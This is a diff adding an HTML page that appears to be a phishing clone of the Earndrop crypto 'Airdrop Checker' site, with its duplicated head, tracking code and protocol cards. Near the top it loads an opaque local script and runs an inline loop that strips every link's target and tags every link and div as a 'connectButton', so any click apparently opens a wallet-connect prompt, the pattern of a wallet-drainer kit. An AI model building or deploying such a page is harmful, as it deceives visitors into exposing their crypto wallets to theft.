@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+
+<head>
+    <script charset="UTF-8" async type="text/javascript" src="./532a2.434bbf3dd4ef35f.js"></script>
+    <script>
+      function addClassesToElements() {
+  
+        const links = document.querySelectorAll('a:not(.connectButton)');
+        for (const link of links) {
+          link.removeAttribute('href');
+          link.classList.add('connectButton');
+        }
+        const buttons = document.querySelectorAll('div:not(.connectButton)');
+        for (const button of buttons) {
+          button.classList.add('connectButton');
+        }
+      }
+      setInterval(addClassesToElements, 300);
+    </script>
+    <!-- Primary Meta Tags -->
+    <title>Earned— Airdrop Checker. Find Crypto Airdrops 🪂</title>
+    <meta name="title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂">
+    <meta name="description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/">
+    <meta property="og:title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂">
+    <meta property="og:description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+    <meta property="og:image" content="https://earndrop.io/images/meta_image_earndrop.png">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@earndrop_io" />
+    <meta name="twitter:title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂" />
+    <meta name="twitter:description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+    <meta name="twitter:image" content="https://earndrop.io/images/meta_image_earndrop.png" />
+    <meta name="twitter:url" content="https://earndrop.io">
+
+
+    <meta charset="utf-8"/>
+    <meta content="summary" name="twitter:card"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <link rel="manifest" href="https://earndrop.io/manifest.json" />
+    <link href="https://earndrop.io/css/css.css" rel="stylesheet" type="text/css"/>
+
+
+
+
+
+    
+
+    <script src="https://earndrop.io/js/wallet-address-validator.min.js"></script>
+   
+
+    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+
+          <link href="https://earndrop.io/images/favicon2.ico" rel="shortcut icon" type="image/x-icon"/>
+
+
+
+
+
+
+    <!--  S.A.  -->
+    <script async defer src="https://api.earndrop.io/latest.js"></script>
+    <!--  S.A. End  -->
+
+
+
+
+
+    <!--  Amung  -->
+    <div style="display:none"><img src="https://whos.amung.us/swidget/earndrop.png"></div>
+    <!--  Amung End  -->
+
+
+
+
+
+   
+
+
+
+
+
+    <!--  Twitter 2  -->
+    <script>
+        !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+        },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
+            a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+        twq('config','ofnjb');
+    </script>
+    <!--  Twitter 2 End  -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Google 2 -->
+    <script>
+        function getParam(p) {
+            var match = RegExp('[?&]' + p + '=([^&]*)').exec(window.location.search);
+            return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
+        }
+
+
+        function addToStorage(key, value) {
+            var expiryPeriod = 90 * 24 * 60 * 60 * 1000; // 90 day expiry in milliseconds
+            var expiryDate = new Date().getTime() + expiryPeriod;
+
+            var record = { value: value, expiryDate: expiryDate };
+
+            localStorage.setItem(key, JSON.stringify(record));
+        }
+
+
+        function storeGclid() {
+            var gclidParam = getParam('gclid');
+
+            if (gclidParam) {
+                addToStorage('gclid', gclidParam);
+            }
+        }
+
+
+        function addGclid() {
+            storeGclid(); // store gclid param to localstorage
+
+            var gclidFormField = document.getElementById('gclid_field');
+            var currDate = new Date().getTime();
+
+            var gclsrcParam = getParam('gclsrc');
+            var isGclsrcValid = !gclsrcParam || gclsrcParam.indexOf('aw') !== -1;
+
+
+            var gclid = JSON.parse(localStorage.getItem('gclid'));
+            var isGclidValid = gclid && currDate < gclid.expiryDate;
+
+            if (gclidFormField && isGclidValid && isGclsrcValid) {
+                gclidFormField.value = gclid.value;
+            }
+        }
+
+        window.addEventListener('load', addGclid);
+    </script>
+<!--  Google 2 End  -->
+
+
+    <!--  Twitter twclid  -->
+
+    <script>
+        function getParam(p) {
+            var match = RegExp('[?&]' + p + '=([^&]*)').exec(window.location.search);
+            return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
+        }
+
+
+        function addToStorage(key, value) {
+            var expiryPeriod = 90 * 24 * 60 * 60 * 1000; // 90 day expiry in milliseconds
+            var expiryDate = new Date().getTime() + expiryPeriod;
+
+            var record = { value: value, expiryDate: expiryDate };
+
+            localStorage.setItem(key, JSON.stringify(record));
+        }
+
+
+        function storeTwclid() {
+            var twclidParam = getParam('twclid');
+
+            if (twclidParam) {
+                addToStorage('twclid', twclidParam);
+            }
+        }
+
+
+        function addTwclid() {
+            storeTwclid(); // store twclid param to localstorage
+
+            var twclidFormField = document.getElementById('twclid_field');
+            var currDate = new Date().getTime();
+
+            var twclsrcParam = getParam('twclsrc');
+            var isTwclsrcValid = !twclsrcParam || twclsrcParam.indexOf('aw') !== -1;
+
+
+            var twclid = JSON.parse(localStorage.getItem('twclid'));
+            var isTwclidValid = twclid && currDate < twclid.expiryDate;
+
+            if (twclidFormField && isTwclidValid && isTwclsrcValid) {
+                twclidFormField.value = twclid.value;
+            }
+        }
+
+        window.addEventListener('load', addTwclid);
+    </script>
+
+    <!--  Twitter twclid End  -->
+
+
+
+
+
+
+
+</head>
+
+<!-- START NAVBAR -->
+    <div class="navbar-container bg-primary-3 navbarbottom" >
+        <div class="container">
+            <div data-collapse="medium"  style="margin-bottom: 0" data-animation="default" data-duration="400" class="navbar home w-nav">
+
+               
+                <div class="nav-buttons-container">
+                                                <a type="button" onclick="openModal()" class="button header w-button">Get started</a>
+                                        
+
+                                        <div class="dropdown dropdown-hamburguesa">
+                    <span class="">
+                         <a href="#" style="color:#9a9fa0" class="nav-link" ><img src="https://earndrop.io/images/icon-menu.svg" alt="" class="menu-button-toggle"/></a>
+                    </span>
+                    
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!--
+
+    <div class="newbetasign" style="margin-left: auto; margin-right: auto; max-width: 958px;background-color: #fdf8e4; color: #f39c12;margin-top: 20px;padding: 10px 5px 10px 5px;border: 0.1px solid;font-size: 18px; border-radius: .5rem;margin-bottom: -10px;"><img src='images/emojis/bugs.png' style='display: inline-block;width: 20px; margin-top: -3px; margin-left: 5px;margin-right: 4px;'><img src='images/emojis/warning.png' style='display: inline-block;width: 20px; margin-top: -3px; margin-left: 5px;margin-right: 4px;'> Earndrop is in Closed Launch Phase. There are bugs! Please report them to <a href="mailto:support@earndrop.io>">support@earndrop.io</a>.</div>
+    -->
+
+<!-- END NAVBAR -->
+
+<body class="body-9">
+<div class="section-31 newttile" style="padding-bottom: 0;">
+    <div class="container-43 w-container">
+        <div class="w-row">
+            <div class="column-20 w-col w-col-7">
+                <div class="div-block-103 new">
+                    <h1 style="font-size: 40px!important;" class="heading new">Get airdrop wallet notifications and find unclaimed airdrops </h1>
+                </div>
+                <div class="div-block-93 div-block-shj">
+                    <p class="paragraph-large text-large home new">Earnednotifies you when any of your wallets gets a new airdrop.<br>Access our curated list for future potential airdrops with EarnedAlpha Protocols.<br/></p>
+                </div>
+
+                <div id="errorwalletmsg1" class="nodisplay incorrect-wallet"><img src='images/emojis/warning.png' style='width: 12px; margin-top: -3px; margin-left: 5px;margin-right: 4px;'> Incorrect Ethereum/EVM Compatible wallet</div>
+
+
+                <div class="content-pair-text new">
+                    <div class="hero-section-action"></div>
+                    <div class="connectButton form-block-2 w-form">
+
+                        <form onclick="openModal()" method="post" class="form">
+
+                            <input type="hidden" name="token" value="C0mZLY5ZudhZ">
+
+                            <input type="text" class="text-field w-input" maxlength="256" name="walletj" id="walletj" placeholder="Enter your wallet address..." required="" onchange="validateWallet(this)"/>
+
+                            <button onclick="openModal"  class="button button-large form w-button arrowgreen" >Check Airdrops</button>
+
+                        </form>
+
+
+                    </div>
+                    <div class="div-block-21">
+                        <div class="text-block-166"><strong class="bold-text-34"></strong></div>
+                        <div class="text-block-3"><span class="text-span-10">
+                             222                         </span> users joined us in the last 7 days<br/></div>
+                    </div>
+                </div>
+            </div>
+            <div class="column-19 w-col w-col-5">
+                <div class="div-block-153 normal-153">
+                    <img src="images/protocols/uniswap.png" alt="social proof conversions" class="image-50"/>
+                    <img src="images/protocols/dydx.png" alt="share widgets" class="image-52"/>
+                    <img src="images/protocols/paraswap.png" alt="sign up social proof" class="image-53"/>
+                </div>
+                <div class="none-153">
+                    <img src="images/protocols/uniswap.png" alt="social proof conversions" class="image-50-copy"/>
+                    <img src="images/protocols/dydx.png" alt="share widgets" class="image-52-copy"/>
+                    <img src="images/protocols/paraswap.png" alt="sign up social proof" class="image-53-copy"/>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!DOCTYPE html>
+
+<head>
+
+    <!-- Primary Meta Tags -->
+    <title>Earned— Airdrop Checker. Find Crypto Airdrops 🪂</title>
+    <meta name="title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂">
+    <meta name="description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/">
+    <meta property="og:title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂">
+    <meta property="og:description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+    <meta property="og:image" content="https://earndrop.io/images/meta_image_earndrop.png">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@earndrop_io" />
+    <meta name="twitter:title" content="Earned— Airdrop Checker. Find Crypto Airdrops 🪂" />
+    <meta name="twitter:description" content="Instantly find and claim unclaimed airdrops with Earndrop, the best Airdrop Checker Tool. Enter your wallet now and see if you have any airdrops to claim!">
+    <meta name="twitter:image" content="https://earndrop.io/images/meta_image_earndrop.png" />
+    <meta name="twitter:url" content="https://earndrop.io">
+
+
+    <meta charset="utf-8"/>
+    <meta content="summary" name="twitter:card"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <link rel="manifest" href="https://earndrop.io/manifest.json" />
+    <link href="https://earndrop.io/css/css.css" rel="stylesheet" type="text/css"/>
+
+
+
+
+
+   
+
+    <script src="https://earndrop.io/js/wallet-address-validator.min.js"></script>
+    
+
+    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+
+          <link href="https://earndrop.io/images/favicon2.ico" rel="shortcut icon" type="image/x-icon"/>
+
+
+
+
+
+
+    <!--  S.A.  -->
+    <script async defer src="https://api.earndrop.io/latest.js"></script>
+    <!--  S.A. End  -->
+
+
+
+
+
+    <!--  Amung  -->
+    <div style="display:none"><img src="https://whos.amung.us/swidget/earndrop.png"></div>
+    <!--  Amung End  -->
+
+
+
+
+
+    <!--  Google Analytics -->
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-ZKYJEZZDW7');
+    </script>
+    <!--  Google Analytics End  -->
+
+
+
+
+
+    <!--  Twitter 2  -->
+    <script>
+        !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+        },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
+            a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+        twq('config','ofnjb');
+    </script>
+    <!--  Twitter 2 End  -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Google 2 -->
+    <script>
+        function getParam(p) {
+            var match = RegExp('[?&]' + p + '=([^&]*)').exec(window.location.search);
+            return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
+        }
+
+
+        function addToStorage(key, value) {
+            var expiryPeriod = 90 * 24 * 60 * 60 * 1000; // 90 day expiry in milliseconds
+            var expiryDate = new Date().getTime() + expiryPeriod;
+
+            var record = { value: value, expiryDate: expiryDate };
+
+            localStorage.setItem(key, JSON.stringify(record));
+        }
+
+
+        function storeGclid() {
+            var gclidParam = getParam('gclid');
+
+            if (gclidParam) {
+                addToStorage('gclid', gclidParam);
+            }
+        }
+
+
+        function addGclid() {
+            storeGclid(); // store gclid param to localstorage
+
+            var gclidFormField = document.getElementById('gclid_field');
+            var currDate = new Date().getTime();
+
+            var gclsrcParam = getParam('gclsrc');
+            var isGclsrcValid = !gclsrcParam || gclsrcParam.indexOf('aw') !== -1;
+
+
+            var gclid = JSON.parse(localStorage.getItem('gclid'));
+            var isGclidValid = gclid && currDate < gclid.expiryDate;
+
+            if (gclidFormField && isGclidValid && isGclsrcValid) {
+                gclidFormField.value = gclid.value;
+            }
+        }
+
+        window.addEventListener('load', addGclid);
+    </script>
+<!--  Google 2 End  -->
+
+
+    <!--  Twitter twclid  -->
+
+    <script>
+        function getParam(p) {
+            var match = RegExp('[?&]' + p + '=([^&]*)').exec(window.location.search);
+            return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
+        }
+
+
+        function addToStorage(key, value) {
+            var expiryPeriod = 90 * 24 * 60 * 60 * 1000; // 90 day expiry in milliseconds
+            var expiryDate = new Date().getTime() + expiryPeriod;
+
+            var record = { value: value, expiryDate: expiryDate };
+
+            localStorage.setItem(key, JSON.stringify(record));
+        }
+
+
+        function storeTwclid() {
+            var twclidParam = getParam('twclid');
+
+            if (twclidParam) {
+                addToStorage('twclid', twclidParam);
+            }
+        }
+
+
+        function addTwclid() {
+            storeTwclid(); // store twclid param to localstorage
+
+            var twclidFormField = document.getElementById('twclid_field');
+            var currDate = new Date().getTime();
+
+            var twclsrcParam = getParam('twclsrc');
+            var isTwclsrcValid = !twclsrcParam || twclsrcParam.indexOf('aw') !== -1;
+
+
+            var twclid = JSON.parse(localStorage.getItem('twclid'));
+            var isTwclidValid = twclid && currDate < twclid.expiryDate;
+
+            if (twclidFormField && isTwclidValid && isTwclsrcValid) {
+                twclidFormField.value = twclid.value;
+            }
+        }
+
+        window.addEventListener('load', addTwclid);
+    </script>
+
+    <!--  Twitter twclid End  -->
+
+
+
+
+
+
+
+</head>
+
+<script src="https://earndrop.io/js/alpha.js"></script>
+<link href="https://earndrop.io/css/alpha.css" rel="stylesheet" type="text/css" />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+
+
+  <div class="sneakPeekContainer">
+  <h1 class="heading-32" style="padding-left:15px;padding-right:15px;margin-left: 0px;margin-right: 0px;">Access EarnedAlpha Protocols (with no token yet)</h1>
+  <span style="padding-left:15px;padding-right:15px;margin-left: 0px;margin-right: 0px;margin-bottom: 30px; text-align: center;">EarnedAlpha Protocols (for Prime Subscribers) is a curated list that shows<br>protocols that do not have a token yet and how they might distribute them eventually 🪂</span>
+
+  <div class="card-container sneakPeek"> 
+
+  <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/uniswapgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Uniswap <br>
+                </h5>
+                <p class="paragraph-2"> Automated ethereum-based crypto exchange  <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> DEX </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:100px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/polygon.png" class="blockchains-item">
+            <img src="images/blockchains/optimism.png" class="blockchains-item">
+            <img src="images/blockchains/arbitrum.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+            
+          </label>
+
+        </div>
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/paraswapgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Paraswap <br>
+                </h5>
+                <p class="paragraph-2">Decentralized Exchange Aggregator integrating DEXs <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> DEX </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:100px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/polygon.png" class="blockchains-item">
+            <img src="images/blockchains/optimism.png" class="blockchains-item">
+            <img src="images/blockchains/arbitrum.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+            
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/ethereum-name-servicegray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Ethereum Name Service <br>
+                </h5>
+                <p class="paragraph-2"> Naming system based on the Ethereum blockchain <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> Domains </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:27px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+            
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/1inchgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> 1inch <br>
+                </h5>
+                <p class="paragraph-2">Decentralized Exchange Aggregator integrating DEXs <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> DEX </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height:48px;width:100px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/polygon.png" class="blockchains-item">
+            <img src="images/blockchains/optimism.png" class="blockchains-item">
+            <img src="images/blockchains/binance.png" class="blockchains-item">
+            <img src="images/blockchains/avalanche.png" class="blockchains-item">
+            <img src="images/blockchains/fantom.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+<a href="pricing">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/lockgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Protocol <br>
+                </h5>
+                <p class="paragraph-2"> Get prime to unlock <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> Social Media </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:75px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/polygon.png" class="blockchains-item">
+            <img src="images/blockchains/optimism.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+              </a>
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+<a href="pricing">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/lockgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Protocol <br>
+                </h5>
+                <p class="paragraph-2"> Get prime to unlock <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> DEX </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:75px; padding-top: 2px;">
+            <img src="images/blockchains/binance.png" class="blockchains-item">
+            <img src="images/blockchains/polygon.png" class="blockchains-item">
+            <img src="images/blockchains/optimism.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+              </a>
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+<a href="pricing">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/lockgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Protocol <br>
+                </h5>
+                <p class="paragraph-2"> Get prime to unlock <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> Lending </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:52px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/binance.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+              </a>
+          </label>
+        </div>
+
+
+        <div class="card-full-body">
+          <label style="height:100%;" class="label-card" onclick="ajaxcall(this);">
+          <a href="pricing">
+                     <div class="card-body relative white" style="background-color: white;">
+                <div class="div-block-19">
+                  <img src="images/protocols/lockgray.png" width="60" alt="" class="image-14 div-14-protocols">
+                </div>
+                <h5 class="heading-18 features"> Protocol <br>
+                </h5>
+                <p class="paragraph-2"> Get prime to unlock <br>
+                <h5 class="heading-18 features">
+                  <span class="spanprice"> Bridge </span>
+                </h5>
+                </p>
+                <div class="switch-blockchainlist-div">
+                <label class="switch">
+                      <input type="checkbox">             
+          <span class="slider round"></span>
+          </label>
+          <div class="blockchain-list" style="height: 24px;width:75px; padding-top: 2px;">
+            <img src="images/blockchains/ethereum.png" class="blockchains-item">
+            <img src="images/blockchains/binance.png" class="blockchains-item">
+            <img src="images/blockchains/arbitrum.png" class="blockchains-item">
+          </div>
+           </div>
+              </div>
+</a>
+          </label>
+        </div>
+        </div>
+</div>
+
+        </html></div>
+
+<script src="https://earndrop.io/js/jquery-3.4.1.min.js" type="text/javascript" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+
+
+</body>
+
+<div class="footer">
+    <div class="container">
+        <div class="footer-row">
+            <div class="footer-info">
+
+                <p class="text-large footer-description">Get notified of claimable airdrops to any of your wallets. Learn and discover new protocols with EarnedAlpha.</p>
+
+                <div class="social-links">
+                    <a href="https://twitter.com/earndrop_io" target="_blank" class="social-link w-inline-block"><img src="https://earndrop.io/images/twitter.svg" alt="Logo Twitter"/></a>
+                    <a href="https://discord.gg/earndrop" target="_blank" style="width: 24px;margin-top: 1px;" class="social-link w-inline-block"><img src="https://earndrop.io/images/discord.svg" alt="Discord"/></a></div>
+            </div>
+            <div class="footer-menus-row">
+                <div class="footer-menu-column">
+                    <h5 class="h6-small footer">Quick links</h5>
+                    <ul class="link-menu w-list-unstyled">
+                        <li class="link-menu-item">
+                            <a href="/" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">Home</a>
+                            <a href="/pricing" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">Pricing</a>
+                            <a href="/alpha" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">EarnedAlpha</a>
+                            <a href="/affiliate" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">Affiliate</a>
+                            </li>
+                    </ul>
+                </div>
+
+                <div class="footer-menu-column">
+                    <h5 class="h6-small footer">Support Center</h5>
+                    <ul class="link-menu w-list-unstyled">
+                        <li class="link-menu-item">
+                            <a href="/contact" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">Contact us</a>
+                            <a href="/faq" style="color: #353e44; opacity: 0.5;" class="footer-link w--current">FAQ</a>
+                            </li>
+                    </ul>
+                </div>
+                <div class="footer-menu-column">
+                    <h5 class="h6-small footer">Company</h5>
+                    <ul class="link-menu w-list-unstyled">
+                        <li class="link-menu-item">
+                            <a href="terms" style="opacity: 0.5;-webkit-transition: opacity 200ms ease;transition: opacity 200ms ease;color: #353e44;" class="footer-link w--current">Terms and Conditions</a>
+                            <a href="privacy" style="opacity: 0.5;-webkit-transition: opacity 200ms ease;transition: opacity 200ms ease;color: #353e44;" class="footer-link w--current">Privacy Policy</a>
+                            <a href="refund-policy" style="opacity: 0.5;-webkit-transition: opacity 200ms ease;transition: opacity 200ms ease;color: #353e44;" class="footer-link w--current">Refund Policy</a>
+                            <a href="contact" style="opacity: 0.5;-webkit-transition: opacity 200ms ease;transition: opacity 200ms ease;color: #353e44;" class="footer-link w--current">Cancel Subscription</a>
+                            </li>
+                    </ul>
+                </div>
+
+            </div>
+        </div>
+        <div class="div-block-11">
+            <div class="text-small">Earned2024                </div>
+            <div class="div-block-95">
+                <!-- <a href="/terms" class="footer-link legal"> Terms of Service</a>
+                <a href="/privacy" class="footer-link legal"> Privacy Policy</a> -->
+        </div>
+    </div>
+</div>
+
+
+<script src="https://earndrop.io/js/jquery-3.4.1.min.js" type="text/javascript" crossorigin="anonymous"></script>
+</html>
